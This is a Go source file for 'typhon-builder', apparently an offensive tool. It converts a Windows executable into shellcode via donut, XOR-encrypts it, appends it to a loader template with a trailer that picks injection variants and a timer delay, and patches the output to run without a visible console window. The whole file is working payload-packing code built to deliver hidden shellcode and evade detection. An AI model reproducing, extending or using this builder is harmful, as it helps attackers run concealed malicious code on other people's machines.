package main

import (
	"bytes"
	"encoding/binary"
	"flag"
	"fmt"
	"os"
	"os/exec"
	"strings"
)

const (
	EmbeddedMagic = 0x50503031 // "PP01"
)

type EmbeddedTrailer struct {
	Magic         uint32
	ShellcodeSize uint32
	VariantMask   uint16
	Flags         uint16
	TimerDelayMs  int64
	XorKey        uint8
	Reserved      [7]uint8
}

func parseVariantMask(arg string) uint16 {
	arg = strings.ToLower(arg)
	switch arg {
	case "all":
		return 0xFFFF
	case "safe":
		return 0x0003 // V1, V2
	case "rec", "recommended":
		return 0x0001 // V1
	case "direct":
		return 0x0040 // V7
	case "timer":
		return 0x0080 // V8
	case "io":
		return 0x0004 // V3
	}
	if len(arg) == 1 && arg[0] >= '1' && arg[0] <= '8' {
		return uint16(1 << (arg[0] - '1'))
	}
	return 0x0001 // Default V1
}

func isPEFile(path string) bool {
	f, err := os.Open(path)
	if err != nil {
		return false
	}
	defer f.Close()
	header := make([]byte, 2)
	f.Read(header)
	return string(header) == "MZ"
}

func main() {
	inputPath := flag.String("i", "", "Input file (.bin or .exe/.dll)")
	outputPath := flag.String("o", "output.exe", "Output file")
	variant := flag.String("variant", "rec", "Variant (all/safe/rec/direct/timer/io/1-8)")
	delay := flag.Int64("delay", 0, "Timer delay in ms")
	debug := flag.Bool("debug", false, "Debug mode (keep console)")
	donutPath := flag.String("donut", "donut", "Path to donut binary")
	templatePath := flag.String("template", "typhon.exe", "Path to typhon.exe template")

	flag.Parse()

	if *inputPath == "" {
		fmt.Println("Usage: typhon-builder -i <input> [-o output.exe] [options]")
		os.Exit(1)
	}

	finalScPath := *inputPath

	// 1. Convert PE to shellcode if needed
	if isPEFile(*inputPath) {
		fmt.Printf("[*] Converting PE to shellcode via donut...\n")
		tmpSc, err := os.CreateTemp("", "typhon-sc-*.bin")
		if err != nil {
			fmt.Printf("[-] Failed to create temp file: %v\n", err)
			os.Exit(1)
		}
		tmpSc.Close()
		defer os.Remove(tmpSc.Name())

		// donut -i input -o output -f 1 -a 2 -e 3 -b 1 -x 1
		cmd := exec.Command(*donutPath, "-i", *inputPath, "-o", tmpSc.Name(), "-f", "1", "-a", "2", "-e", "3", "-b", "1", "-x", "1")
		var stderr bytes.Buffer
		cmd.Stderr = &stderr
		if err := cmd.Run(); err != nil {
			fmt.Printf("[-] Donut failed: %v\n%s\n", err, stderr.String())
			os.Exit(1)
		}
		finalScPath = tmpSc.Name()
	}

	// 2. Read shellcode
	scData, err := os.ReadFile(finalScPath)
	if err != nil {
		fmt.Printf("[-] Failed to read shellcode: %v\n", err)
		os.Exit(1)
	}

	// 3. Generate XOR key and encrypt
	var xorKey uint8 = 0
	for _, b := range scData {
		xorKey = xorKey*31 + b
	}
	if xorKey == 0 {
		xorKey = 0x41
	}
	for i := range scData {
		scData[i] ^= xorKey
	}

	// 4. Read template
	templateData, err := os.ReadFile(*templatePath)
	if err != nil {
		fmt.Printf("[-] Failed to read template (%s): %v\n", *templatePath, err)
		os.Exit(1)
	}

	// 5. Strip existing trailer if present
	if len(templateData) > 32 {
		trailerOff := len(templateData) - 32
		magic := binary.LittleEndian.Uint32(templateData[trailerOff : trailerOff+4])
		if magic == EmbeddedMagic {
			scSize := binary.LittleEndian.Uint32(templateData[trailerOff+4 : trailerOff+8])
			templateData = templateData[:len(templateData)-32-int(scSize)]
		}
	}

	// 6. Build new trailer
	trailer := EmbeddedTrailer{
		Magic:         EmbeddedMagic,
		ShellcodeSize: uint32(len(scData)),
		VariantMask:   parseVariantMask(*variant),
		TimerDelayMs:  *delay,
		XorKey:        xorKey,
	}
	if !*debug {
		trailer.Flags = 0x0001 // Silent
	}

	// 7. Write output
	out, err := os.Create(*outputPath)
	if err != nil {
		fmt.Printf("[-] Failed to create output: %v\n", err)
		os.Exit(1)
	}
	defer out.Close()

	out.Write(templateData)
	out.Write(scData)
	binary.Write(out, binary.LittleEndian, trailer)

	// 8. Patch Subsystem (CONSOLE -> WINDOWS) if not debug
	if !*debug {
		patchSubsystem(*outputPath)
	}

	fmt.Printf("[+] Successfully built: %s\n", *outputPath)
}

func patchSubsystem(path string) {
	f, err := os.OpenFile(path, os.O_RDWR, 0)
	if err != nil {
		return
	}
	defer f.Close()

	// Read PE offset
	f.Seek(0x3C, 0)
	var peOff uint32
	binary.Read(f, binary.LittleEndian, &peOff)

	// Subsystem is at PE + 24 + 68
	subsysOff := int64(peOff) + 24 + 68
	f.Seek(subsysOff, 0)
	var subsys uint16
	binary.Read(f, binary.LittleEndian, &subsys)

	if subsys == 3 { // CUI
		f.Seek(subsysOff, 0)
		subsys = 2 // GUI
		binary.Write(f, binary.LittleEndian, subsys)
	}
}
